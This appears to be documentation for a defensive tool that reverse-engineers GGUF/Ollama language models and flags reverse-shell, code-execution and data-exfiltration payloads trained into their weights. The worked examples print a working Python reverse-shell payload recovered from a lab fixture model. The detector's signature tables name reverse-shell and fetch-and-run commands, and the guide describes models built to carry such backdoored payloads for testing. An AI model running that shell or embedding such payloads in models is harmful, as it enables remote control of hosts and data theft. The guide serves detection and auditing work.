---
title: "Blackbox Model Security RE — Static & Dynamic Analysis of a Loadable Model"
description: "Host-only methodology and tooling to reverse-engineer a ready-to-load LLM (Ollama/GGUF): static artifact analysis + dynamic behavioral probing, with the exact tools, APIs, libraries and techniques used."
pub_id: "Guide — Model Security RE"
version: "v1"
pub_date: "June 2026"
permalink: /guides/model-security-re/
permalink_fr: /fr/guides/model-security-re/
keywords: "model security, reverse engineering, GGUF, Ollama, static analysis, dynamic analysis, blackbox, exec capability, nocode, payload in the weights"
---

# Blackbox Model Security RE — Static & Dynamic Analysis

Host-only methodology to reverse-engineer a model that is **ready to load** (downloaded and served
by Ollama), to **extract its content**, judge **security issues from that content**, and decide
whether it **encodes a command/code-execution capability**. Two complementary tracks:

| Track | What it does | Runs the model? |
|---|---|---|
| **Static** | Parses the Ollama-downloaded GGUF file | **No** — artifact only |
| **Dynamic** | Queries the loaded model live, treats output as evidence | Yes — read-only, output never executed |

**Blackbox trust boundary (hard rule).** Both tracks use **only** (a) the model artifact and
(b) live query access. They never read the client/app source, the training files, or the HF source
(those are later *whitebox* phases). Grammar reconstruction **discovers its own symbols from the
model** (vocab merges) — a real analyst auditing an unknown model has only the model.

**Independent code.** The RE/security tooling is **new code written for analysis**, not a reuse of
the host model-creation solution — its only dependencies are the external `gguf-py` parsing library
and the Ollama API. It generalises across GGUF model types (**qwen2 / llama / mistral**), not just
the NPU calculator model.

Tooling: [`model_security_re.py`](../model_security_re.py) (CLI) +
[`classes/class_model_security.py`](../classes/class_model_security.py) (analysis classes).

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TB
    subgraph BB["Blackbox boundary — only allowed inputs"]
        ART["GGUF artifact<br/>(Ollama-downloaded blob)"]
        LIVE["Loaded model<br/>(Ollama API)"]
    end
    ART --> S["STATIC track<br/>parse — never load"]
    LIVE --> D["DYNAMIC track<br/>probe — output = evidence"]
    S --> V{"Compose verdict"}
    D --> V
    V --> R["Analyst report<br/>§2 integrity: INTEGRAL / TAMPERED / ROGUE<br/>§3 risk: MALICIOUS-CONTENT / OBFUSCATED-EXEC / EXECUTION-SURFACE / CLEAN"]
    X["client source · training files · HF source"]:::no -.->|excluded in Phase-1| BB
    classDef no fill:#fdd,stroke:#900,color:#900;
```

---

## Verdict taxonomy (what the code actually emits)

The CLI produces a **3-section analyst report**. Each section ends in its own verdict string —
these are the exact tokens the code emits (`scripts/model_security/integrity.py` ·
`scripts/model_security/threat.py`), not analyst prose:

| Section | Verdict strings | Source |
|---|---|---|
| **§1 Reconstitution** | *(no verdict — recovers the content: grammar symbols + reconstructed bodies)* | `reconstruct.py` |
| **§2 Integrity** | **`INTEGRAL`** · **`TAMPERED`** · **`ROGUE`** | `integrity.threat_verdict` → `integrity.check_integrity` |
| **§3 Security risks** (`RISK VERDICT:`) | **`MALICIOUS-CONTENT`** · **`OBFUSCATED-EXEC`** · **`EXECUTION-SURFACE`** · **`CLEAN`** | `threat.threat_verdict` |

- **§2 integrity** compares the blackbox reconstitution against the enterprise's *approved business
  models*: `INTEGRAL` (matches an approved model), `TAMPERED` (matches with deviation — a missing/added
  symbol **or an added exec-capable body**, see below), `ROGUE` (matches none). `TAMPERED`/`ROGUE` raise a
  security incident.
- **§3 risk** judges the *content/behaviour* regardless of provenance:
  `MALICIOUS-CONTENT` (literal exec/C2 signature present — in metadata/template **or** in the recovered
  weights), `OBFUSCATED-EXEC` (a hidden alias/action-grammar drives execution via a client),
  `EXECUTION-SURFACE` (a tool/function-calling template — benign by design, an RCE path with a naive
  client), `CLEAN` (none of the above). A `[critical]` YARA hit **vetoes** `CLEAN`.

> **Note on older verdict names.** Earlier drafts of this guide used `INERT` /
> `INCONCLUSIVE` / `EXECUTABLE-CAPABILITY`. Those are **not** code verdict strings — they were
> analyst-attributed shorthand for an early static-only ladder. The detector now emits the §3 RISK
> VERDICT above; where this guide still says a clean grammar model is "inert", read that as analyst
> prose for the §3 `CLEAN` / §2 `INTEGRAL` pair, not a verdict the code prints.

---

## Static track — tools, APIs, libraries, techniques

The artifact is parsed in **pure Python** — we deliberately do **not** hand the file to llama.cpp's
native loader first, because that C parser carries live memory-corruption CVEs
(**CVE-2025-53630** and its bypass **CVE-2026-27940** — integer overflow → heap OOB / code-exec on
load). Static analysis stays in a memory-safe reader.

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart LR
    A["ollama show --modelfile<br/>→ FROM blob path"] --> B["copy blob + sha256<br/>(verify vs manifest digest)"]
    B --> C["GGUFReader<br/>(pure-Python, memory-safe)"]
    C --> D["Format-safety triage<br/>offset+size · overflow · overrun"]
    C --> E["Content extract<br/>metadata · tokenizer · tensors"]
    E --> F["Exec-capability sweep<br/>patterns A,E (hardened)"]
    D --> G["Static report + verdict"]
    F --> G
```

| What | Tool / API / library | Where | Why |
|---|---|---|---|
| GGUF parsing | **`gguf.GGUFReader`** (llama.cpp `gguf-py`, pure-Python) | vendored `llama.cpp/gguf-py` | memory-safe read of header / metadata KV / tensor table — no native deref |
| Metadata dump (manual) | **`gguf_dump.py`** | `llama.cpp/gguf-py/gguf/scripts/` | first-pass human dump of KV + tensors |
| Acquisition | **`ollama show --modelfile`** (Ollama CLI) | `subprocess` | resolves the `FROM` blob path + `TEMPLATE` + `PARAMETER`s of the downloaded model |
| Chain-of-custody | **`hashlib.sha256`** (stdlib) | `class_model_security.py` | hash the blob, verify it against the Ollama manifest digest |
| Token decode | **GPT-2 byte-level decoder** (technique) | `gpt2_decode()` | the tokenizer is `gpt2`; decode byte-level tokens to readable text |
| Encoded-payload test | **`base64`, `binascii`, `math` (Shannon entropy)** (stdlib) | `ExecCapabilityDetector` | distinguish a real encoded blob from a dictionary word |
| Pattern matching | **`re`** (stdlib) | detector | command/code signatures over vocab + metadata |

**Techniques:**
- **Format-safety triage** (CVE-2025-53630 / -27940 class): for every tensor, verify
  `data_offset + n_bytes ≤ file_size`, check **shape-product overflow** (uint64 wrap), and detect
  **cumulative-region overrun** (the wrap-around undersizing pattern). Done from `GGUFReader`
  metadata only — the model is never loaded.
- **Content extraction**: all metadata KV, the full tokenizer (tokens/scores/types/merges), the
  tensor inventory (name/shape/dtype/bytes/offset), and the Ollama template.
- **BPE-merge grammar leak**: the merge table reassembles the training grammar's vocabulary
  (e.g. `te+rm→term`, `ex+pr→expr`, ` fac+tor→ factor`) — partial structure recovery from the
  artifact alone.
- **Exec-capability sweep** — the L1-DIRECT / L2-OBFUSCATION / L3-AGENCY layers (see below). On a
  nocode model the load-bearing surface is **L1-WEIGHTS** (the dynamically recovered bodies), since a
  weights-carried payload is invisible to this static pass.

---

## Dynamic track — tools, APIs, libraries, techniques

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart LR
    P["Prompt battery<br/>BNF-form + prose"] --> Q["Ollama POST /api/generate<br/>temp 0, stream off"]
    Q --> R["Read output<br/>(evidence — never executed)"]
    R --> S["Reconstruct BNF<br/>fuse with artifact merges"]
    S --> T["Recall score<br/>vs offline oracle"]
    T --> U["Confirm/clear static LOW flags"]
```

| What | Tool / API | Where | Why |
|---|---|---|---|
| Live inference | **Ollama HTTP API** `POST /api/generate` (`localhost:11434`) | `urllib.request` (stdlib) | deterministic queries: `stream:false`, `temperature:0`, `num_predict` |
| Model inspection | **`ollama show --modelfile / --template / --parameters`** | CLI | the template is the client-side injection surface |
| Red-team probes *(named, Phase-1+)* | **garak** (NVIDIA) | external (pip) | jailbreak / prompt-injection / prompt-extraction probes |

**Techniques:**
- **Model-only symbol discovery** (`discover_symbols`): seeds for reconstruction are derived from
  the **artifact's own vocab** (the BPE merges assemble candidate symbols like `term`, `expr`,
  `factor`). Never seeded from host grammar files — the analyst bootstraps from the model itself.
- **Grammar reconstruction by prompt battery**: probe each discovered symbol with a **mixed
  battery** — BNF-form (`<factor> ::=`) **and** prose (`A factor is`). Prose escapes the temp-0
  attractor that collapses BNF prompts onto the dominant rule; together they raise rule recall.
- **Recall scoring (self-test only)**: scoring against `grammars/playbook_model_calculator.txt` is
  valid **only because we built this model**. It is never an input to reconstruction — a real
  engagement against an unknown model has no oracle.
- **Output-is-evidence rule**: nothing the model emits is ever executed — no client runner in the
  loop. We only read the text.

> **Honesty note on current state:** the dynamic probing today is **hand-rolled via the Ollama
> API** (the prompt battery above). **garak / OWASP-LLM-Top-10 / MITRE-ATLAS** are the named
> frameworks for the red-team layer and the risk mapping — they are wired in next, not yet run.

---

## Exec-capability detector — patterns & hardening

The §3 RISK VERDICT is decided by `threat.threat_scan` → `threat.threat_verdict`, which scans **three
regions** and tags each finding with a layer + severity:

| Region tag | What is scanned | When |
|---|---|---|
| **L1-DIRECT** | the model's **metadata + chat template** | always |
| **L1-WEIGHTS** | the **recovered nocode bodies** — the logic the model emits *from its tensors* | dynamic, nocode |
| **L2-OBFUSCATION** | the **alias/action-grammar shape** (commands hidden behind benign tokens) | generative, small vocab |
| **L3-AGENCY** | the **tool/function-calling chat template** (excessive-agency surface) | always |

Plus **binary forensics** (strings / binwalk / YARA) over the raw blob; a `[critical]` YARA hit
escalates the verdict (it vetoes `CLEAN`).

**The exec/C2 signatures (`threat._DIRECT_SIGNATURES`)** — matched over both L1-DIRECT (metadata/template)
and **L1-WEIGHTS (the recovered bodies)**:

| Signature | Detects | Pattern (abridged) |
|---|---|---|
| **`reverse_shell`** | shell-spawning back-connect | `/dev/tcp/…`, `bash -i >&`, `nc -e`, `mkfifo … nc` |
| **`code_exec`** | arbitrary code/command execution | `os.system`, `subprocess.`, `__import__(`, `powershell -enc`, `base64.b64decode` |
| **`download_exec`** | fetch-and-run | `curl`/`wget`/`certutil`/`Invoke-WebRequest … http(s)://` |

**Two body heuristics run over the recovered weights (L1-WEIGHTS) on top of the regex signatures:**

| Heuristic | Detects | Trigger |
|---|---|---|
| **`py_reverse_shell`** | a Python connect-back **interactive shell** | `socket` + `connect` + one of `/bin/sh`, `/bin/bash`, `os.dup2`, `pty.spawn`, `subprocess` |
| **`data_exfil`** | **network egress** — gather data and ship it off-host (no interactive shell) | an outbound `connect((…))` *or* `http(s)://` **plus** a send call: `sendall`, `.send(`, `requests.post/put`, `urlopen`, `HTTPConnection` |

Every L1-WEIGHTS finding is `CRITICAL` → `MALICIOUS-CONTENT`. The distinction between `py_reverse_shell`
(an interactive shell) and `data_exfil` (a one-way send) tells the auditor *what the carried payload
does*, both surfaced from the **same recovered body**.

**Hardening (learned from real false positives on the calculator model):**
- **BPE sub-word fragments** — `rm` is flagged only as **LOW** confidence because it is almost
  always the fragment of `te`+`rm`→**term**, not the shell command. Short dangerous words are
  LOW + *"confirm dynamically"*; only multi-char unambiguous signatures (`subprocess`,
  `os.system`, `/bin/sh`) are **HIGH**.
- **Dictionary-word / identifier base64** — `calculator` and CamelCase identifiers like
  `InitializeComponent` matched a naive base64 check. Hardened: a candidate must carry a **digit or
  `+`/`/`/`=` (or be hex)** — pure-alpha is a word/identifier, not a payload — **and** decode to
  **Shannon entropy ≥ 4.0**.
- **Model-class awareness (`acquire.classify_model_type` / `classify_nocode`)** — a general LLM's
  150k-token vocab *always* contains `import`, `system`, `exec`, `subprocess`, `curl`… because it was
  trained on code. So on a **general** model the L1-DIRECT signatures are **not** matched against the
  30k+ vocab — only against metadata + template — and the L2-OBFUSCATION action-grammar test is gated
  to a **small** (`< 4000`-token) generative vocab. On a general model the meaningful exec signal is
  the **L3-AGENCY** tool/function-calling template (plus behaviour). On a **minimal/grammar** model a
  curated vocab plus the **recovered weights** (L1-WEIGHTS) carry the real signal.

**Verdict ladder (`threat.threat_verdict`):** the verdict is the **highest-severity layer present**:

| Condition | §3 RISK VERDICT |
|---|---|
| any `CRITICAL` finding (L1-DIRECT *or* L1-WEIGHTS) **or** a `[critical]` YARA hit | **`MALICIOUS-CONTENT`** |
| else an `L2-OBFUSCATION` finding | **`OBFUSCATED-EXEC`** |
| else an `L3-AGENCY` finding | **`EXECUTION-SURFACE`** |
| none of the above | **`CLEAN`** |

```mermaid
%%{init: {'theme':'neutral'}}%%
flowchart TD
    F["Findings (L1-DIRECT · L1-WEIGHTS · L2 · L3) + YARA"] --> C{"any CRITICAL<br/>or [critical] YARA?"}
    C -->|yes| MC["MALICIOUS-CONTENT"]
    C -->|no| O{"L2-OBFUSCATION?"}
    O -->|yes| OE["OBFUSCATED-EXEC"]
    O -->|no| A{"L3-AGENCY?"}
    A -->|yes| ES["EXECUTION-SURFACE"]
    A -->|no| CL["CLEAN"]
```

---

## Nocode-aware analysis — the payload lives in the weights

The single most important insight for grammar-built / **nocode** models: such a model carries its
**executable payload in the TENSOR WEIGHTS**, not in metadata or the chat template. It is trained on
`"<grammar> <token>"` anchors — the prompt is a grammar name + a route token, the completion is the
**body** (a code payload, a BNF rule, or a sub-route list). So a static artifact scan of the
metadata/template is **blind** to the payload: a reverse shell carried this way shows up on **no**
string in the file's metadata. Dynamic reconstruction is therefore the **load-bearing** capability,
which is why nocode models are **dynamic-mandatory**.

**1 · Detection (`acquire.classify_nocode`).** Blackbox signal: a **tiny vocab** (general LLMs are
30k–150k tokens; a grammar-built model is a few hundred) whose decoded tokens carry grammar/code-ish
atoms (`::=`, `import`, `socket`, `subprocess`, `def`, `routes`, …). Uses only the artifact.

**2 · Dynamic-mandatory mode (`acquire.resolve_mode(is_nocode=…, endpoint_live=…)`).** Once a model is
classed nocode, static-only is declared **insufficient**:
- `--dynamic` requested + permitted → mode reason: *"dynamic REQUIRED & PERMITTED … static-only cannot
  see it"* (mode `static+dynamic`);
- no `--dynamic` but a live endpoint exists → *"dynamic RECOMMENDED — re-run with `--dynamic`"*;
- no live endpoint → *"STATIC-ONLY INSUFFICIENT — a weights-carried reverse shell / code-exec cannot
  be seen by artifact-only analysis"*.

**3 · Reconstruction (`reconstruct.reconstruct_nocode`).** Two blackbox steps, only the model + live
queries — never the host grammar/training files:
- **`discover_grammar_roots`** — probe the model and parse its own self-described `routes: …` manifest
  to mine the grammar roots (the model *self-describes* when nudged). Code bodies are never parsed as
  routes, so payload fragments don't pollute the root set.
- **`recover_nocode_bodies`** — probe the trained `"<grammar> <token>"` namespace over those roots at
  **`num_predict=128`** and keep, per root, the single cleanest payload-like completion. The larger
  `num_predict` recovers the **FULL body** (the legacy `reconstruct_dynamic` vocab-seeded probes at
  `n=48` only caught garbled head fragments — it remains the graceful-degrade fallback for general
  models).

**4 · Threat over the bodies (`threat.threat_scan(..., recon_bodies=…)`).** The recovered bodies are
tagged **L1-WEIGHTS** and run through the same exec/C2 signatures plus the `py_reverse_shell` /
`data_exfil` heuristics. Any hit → `CRITICAL` → `MALICIOUS-CONTENT`.

**5 · Integrity over the bodies (`integrity.check_integrity(..., recon_bodies=…)`).** A nocode model
can be tampered by **added capability** rather than added symbol: the grammar symbols still match the
approved set, but a recovered body now spawns a shell. `integrity.body_capabilities` computes the
recovered capability profile; against the matched approved model's *sanctioned* profile (from the
registry allowlist — `exec_capable` / `approved_capabilities`), **any unsanctioned exec capability
forces `TAMPERED` even at 100 % symbol recall** (`tamper_by_capability`). A pure-grammar / print-only
model recovers an empty capability set and stays `INTEGRAL`.

**6 · The EVIDENCE line (`threat.select_evidence_payload` → `threat.render_threat`).** Under a non-`CLEAN`
RISK VERDICT the report prints the single most incriminating recovered body verbatim — the auditor
sees the **actual shell carried in the weights**, not just a signature name:

> **EVIDENCE — recovered payload** (decoded from the weights, `revshell_localhost revshell`):
>
> ```python
> import socket, subprocess, os
> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
> s.connect(('127.0.0.1', 1234))
> os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
> subprocess.call(['/bin/sh', '-i'])
> ```

---

## Frameworks & later-phase tools (named, not all wired yet)

| Purpose | Reference |
|---|---|
| App-layer risk taxonomy | **OWASP Top-10 for LLM Applications** |
| Adversarial TTP knowledge base | **MITRE ATLAS** |
| Governance | **NIST AI RMF** |
| LLM red-team probes | **garak** (NVIDIA) |
| Serialization-attack scanning *(Phase-2 whitebox, pickle in HF source)* | **ModelScan** (Protect AI), **picklescan**, **fickling** (Trail of Bits) |

GGUF itself is **not** pickle, so ModelScan/picklescan/fickling apply to the upstream *conception*
files (`.bin`/`.pt`) in the later whitebox phase — not to the blackbox GGUF.

---

## Forensic tooling landscape (community libraries & tools)

Curated for *extracting and forensically analysing a ready-to-load model*, with honest positioning.

**Core extraction (artifact) — directly useful:**
| Tool | Role | Status here |
|---|---|---|
| **`gguf-py` `GGUFReader`** | structured GGUF parse (metadata/vocab/tensors), memory-safe | ✅ in use |
| **`strings`** | pull embedded ASCII/UTF strings straight from the blob — complements the structured parse (recovers the recon vocabulary directly) | ✅ available, to wire |
| **`binwalk`** | entropy scan + carving — flag encrypted/compressed/appended regions (hidden payloads) | ✅ available, to wire |
| **YARA** | signature rules over the blob — command / C2 / payload patterns (`model_security_rules/recon_c2.yar`) | ✅ in use — a `[critical]` hit vetoes `CLEAN` |
| **FLOSS** (Mandiant) | de-obfuscate hidden/stacked strings — for evasion & crypted payloads | ☐ recommend |
| **capa** (Mandiant) | capability detection (defense-evasion, networking) | ☐ recommend |

**Whitebox / behavioural (later phases):** ModelScan · picklescan · fickling (pickle in HF source);
garak (behavioural red-team); safetensors + HF `transformers`/`tokenizers` (conception inspection).

**Graph / analysis:** **NetworkX** — model the alias **composition graph** / recon procedure tree
(we emit a text graph today; NetworkX enables traversal + visualisation). numpy/scikit-learn —
cluster token-embedding weights to surface anomalous/off-theme tokens.

**mem0 / chromadb — honest positioning.** These are **vector-DB / agent-memory** layers, *not*
model-file forensic extractors (they don't open a GGUF). They are valuable as a **layer on top of**
extraction:
- **chromadb** (+ an embedding model) — embed extracted tokens/strings/aliases and run **semantic
  similarity** to flag content close to *shell-command / recon / C2 / exfiltration* even when
  obfuscated or novel — catches what a keyword list misses (strengthens patterns A/E and the C2
  phase).
- **mem0** — **cross-case forensic memory**: accumulate findings across analysed models so the
  detector recognises *"this alias-set ≈ a known recon family"* and recalls similar prior cases
  (the "train the detector" direction).

Verdict: use **strings/binwalk/YARA/FLOSS/capa** for *extraction & payload discovery*; use
**chromadb/mem0** for *semantic detection & case memory* — complementary, not substitutes.

## Reproduce

The CLI is `scripts/model_security_re.py analyze` — it runs all three sections into a master report.
Default mode is **STATIC** (artifact-only, never loads the model); `--dynamic` opts in to live probing
(gated to generative + static-safe; **mandatory** for nocode models — it is the only surface that can
recover a weights-carried payload).

```bash
# STATIC — artifact-only, no model load (default)
python3 scripts/model_security_re.py analyze --ollama model_calculator_nocode_v1
python3 scripts/model_security_re.py analyze --gguf  model_calculator_version_1.gguf

# DYNAMIC — live probing + nocode reconstruction (recovers the weights-carried payload)
python3 scripts/model_security_re.py analyze --ollama model_revshell_localhost_v1 --dynamic

# integrity needs the approved-model registry (the enterprise allowlist)
python3 scripts/model_security_re.py analyze --ollama model_calculator_nocode_v1 --dynamic \
        --registry models/approved_models.json
```

Single-section variants exist too: `reconstruct` (§1), `integrity` (§2, needs `--registry`/`--assets`),
`threat` (§3). Output is written under `models/forensics/<date>/<model>/` (`report.md`, per-section
files, and `INCIDENT.md` for a dangerous verdict).

## Worked examples (real scanner output)

The lab fixtures **`revshell_localhost`**, **`revshell_param`**, and **`recon_exfil`** are **positive
controls** for this scanner — the nocode runner builds them and carries the payload *in the model*
(see `docs/NOCODE_RUNNER.md` § Security fixtures). The calculator grammar is the **clean negative**.
All four are nocode models, so each is run with `--dynamic`.

### `model_revshell_localhost_v1 --dynamic` → `MALICIOUS-CONTENT`

A reverse-TCP-shell payload carried verbatim in the weights. Mode reason: *"dynamic REQUIRED &
PERMITTED — nocode/grammar model carries its payload in the WEIGHTS (static-only cannot see it)"*. The
nocode reconstruction discovers roots `['localhost', 'revshell', 'revshell_localhost']` blackbox and
recovers the body:

```
## Exec-capability findings (L1 direct · L2 obfuscation · L3 agency)
- **[CRITICAL]** L1-WEIGHTS/code_exec: emitted from model weights: subprocess.
- **[CRITICAL]** L1-WEIGHTS/py_reverse_shell: emitted from model weights: socket connect-back + shell spawn

## Binary forensics (strings · binwalk · YARA)
- strings: 110,697 · urls — · ips — · onion —
- YARA **[critical]** `shell_exec_signature` — Direct shell / code-execution signatures (1 hits)

**RISK VERDICT:** MALICIOUS-CONTENT — literal executable/C2 signatures present in the model

**EVIDENCE — recovered payload** (decoded from the weights, `revshell_localhost revshell`):
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1234))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])
```

### `model_recon_exfil_v1 --dynamic` → `MALICIOUS-CONTENT` (`data_exfil`)

Gathers host data, then ships it off-host — a one-way egress, not an interactive shell. The recovered
`exfil_to_localhost` body is `socket.connect((…)) … s.sendall(json.dumps(gather_host).encode())`, which
trips the **`data_exfil`** heuristic (outbound connect + a `sendall`):

```
## Exec-capability findings (L1 direct · L2 obfuscation · L3 agency)
- **[CRITICAL]** L1-WEIGHTS/data_exfil: emitted from model weights: network egress (send/post over socket/HTTP) — data exfiltration

## Binary forensics (strings · binwalk · YARA)
- strings: 117,852 · urls — · ips — · onion —
- YARA **[critical]** `c2_network_indicator` — Possible C2 / network endpoint indicators (URL, IP, onion) (1 hits)

**RISK VERDICT:** MALICIOUS-CONTENT — literal executable/C2 signatures present in the model
```

### `model_calculator_nocode_v1 --dynamic` → `CLEAN` (the negative control)

The calculator grammar recovers only BNF rule bodies (`expr "+" term`, `factor digit ::= "0" | "1"`,
…) — no exec/C2 content, no action-grammar. The detector finds nothing and the model is clean:

```
## Exec-capability findings (L1 direct · L2 obfuscation · L3 agency)
- no findings

## Binary forensics (strings · binwalk · YARA)
- strings: 78,346 · urls — · ips — · onion —

**RISK VERDICT:** CLEAN — no literal executable/C2 content and no hidden action-grammar
```

The contrast is the whole point: the calculator and the reverse shell are **both** nocode models with
near-identical artifacts; only by **recovering the bodies from the weights** (dynamic, nocode-aware)
does the reverse shell betray itself. A static-only scan sees neither payload.

---

## Roadmap

**Phase 2 — advanced payload discovery (blackbox, harder signals).** Once confident on the basic
patterns, evolve the detector toward:
- **Crypted / obfuscated payloads** — beyond base64/hex: XOR/rot/gzip/zlib layers, split-and-
  reassemble tokens, homoglyph/unicode-escape smuggling. *(The plain nocode case — a payload trained
  into the `"<grammar> <token>"` weights — is already handled by the nocode reconstruction above; the
  remaining work is harder weights-encodings that don't surface as clean trained bodies.)*
- **Detection-evasion techniques** — recognise content shaped to slip naive scanners (low-entropy
  encodings, benign-looking templates that compose into execution, staged/multi-turn payloads).
- **C2 backchannel indicators** — detect a model whose content/behaviour encodes
  command-and-control hints: hardcoded hosts/IPs/onion URLs, beacon-like output patterns,
  exfiltration directives, or tool-call schemas pointed at attacker infrastructure.

**Phase 3 — whitebox, conception-files-up.** Reverse from the conception files (HF `safetensors`
internals, training provenance), run serialization scanners (**ModelScan / picklescan / fickling**)
on any pickle, and resolve grammar alias-tokens to their real command strings. Out of the Phase-1
blackbox boundary; the Stage-2 provenance hook stubs the entry point.

These build on the **combined-technique** analysis: a compromised client/host that executes model
output is the other half of the chain — modelled to train the detector, never required to flag the
model-side capability.
